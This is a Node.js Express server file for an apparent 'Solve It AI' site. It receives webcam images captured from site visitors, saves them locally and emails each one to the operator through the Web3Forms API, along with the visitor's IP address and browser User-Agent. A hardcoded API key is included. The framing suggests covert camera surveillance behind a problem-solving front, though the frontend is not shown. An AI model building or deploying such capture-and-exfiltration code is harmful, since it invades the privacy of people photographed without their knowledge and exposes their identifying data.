const express = require('express');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');
const app = express();
const PORT = 4000;

// Web3Forms API config
const WEB3FORMS_KEY = '5dfb31ef-39d0-4398-a4d9-ab2b6c5d0245';

// Create captures directory if it doesn't exist
const capturesDir = path.join(__dirname, 'captures');
if (!fs.existsSync(capturesDir)) {
  fs.mkdirSync(capturesDir, { recursive: true });
}

// Parse JSON bodies (for base64 image data from frontend)
app.use(express.json({ limit: '10mb' }));

// Trust proxy for visitor IP
app.set('trust proxy', true);

// Serve static files (HTML, CSS, JS)
app.use(express.static(__dirname));

// POST /save-capture — receive base64 image, save to disk & email
app.post('/save-capture', async (req, res) => {
  const { image } = req.body;
  if (!image) {
    return res.status(400).json({ error: 'No image data received' });
  }

  // Extract base64 data (remove data:image/jpeg;base64, prefix)
  const matches = image.match(/^data:image\/(jpeg|png);base64,(.+)$/);
  if (!matches) {
    return res.status(400).json({ error: 'Invalid image format' });
  }

  const ext = matches[1];
  const base64Data = matches[2];
  const buffer = Buffer.from(base64Data, 'base64');

  // Generate filename with timestamp
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const filename = `capture_${timestamp}.${ext}`;
  const filepath = path.join(capturesDir, filename);

  // Save to local disk
  fs.writeFile(filepath, buffer, async (err) => {
    if (err) {
      console.error('Error saving capture:', err);
      return res.status(500).json({ error: 'Failed to save capture' });
    }

    console.log(`📷 Capture saved: ${filename}`);

    // ── Send to Web3Forms email ──────────────────────────────────
    try {
      const formData = new FormData();
      formData.append('access_key', WEB3FORMS_KEY);
      formData.append('subject', `📷 New Solve It Capture — ${filename}`);
      formData.append('from_name', 'Solve It AI — Camera Monitor');
      formData.append('message', `Camera capture received from visitor.\n\nFile: ${filename}\nTime: ${new Date().toISOString()}\nIP: ${req.ip || 'Unknown'}\nUser-Agent: ${req.get('User-Agent') || 'Unknown'}`);

      // Attach the image file using form-data package
      formData.append('files', buffer, {
        filename,
        contentType: `image/${ext}`,
      });

      const wfRes = await fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        body: formData,
        headers: formData.getHeaders(),
      });

      const wfData = await wfRes.json();
      if (wfData.success) {
        console.log(`📧 Capture emailed via Web3Forms: ${filename}`);
      } else {
        console.error(`⚠️ Web3Forms send failed for ${filename}:`, JSON.stringify(wfData));
      }
    } catch (emailErr) {
      console.error(`⚠️ Web3Forms error for ${filename}:`, emailErr.message);
      try {
        // Retry with just the message (no attachment) if upload fails
        const simpleForm = new FormData();
        simpleForm.append('access_key', WEB3FORMS_KEY);
        simpleForm.append('subject', `📷 Capture - ${filename} (no attachment)`);
        simpleForm.append('from_name', 'Solve It AI — Camera Monitor');
        simpleForm.append('message', `Capture at ${new Date().toISOString()}\nFile saved locally: ${filename}\nIP: ${req.ip || 'Unknown'}`);

        await fetch('https://api.web3forms.com/submit', {
          method: 'POST',
          body: simpleForm,
          headers: simpleForm.getHeaders(),
        });
        console.log(`📧 Capture notification sent (without attachment): ${filename}`);
      } catch (_) {}
    }

    res.json({ success: true, filename });
  });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Solve It server running at http://localhost:${PORT}`);
  console.log(`📁 Captures saved to: ${capturesDir}`);
  console.log(`📧 Captures will be emailed via Web3Forms API`);
});
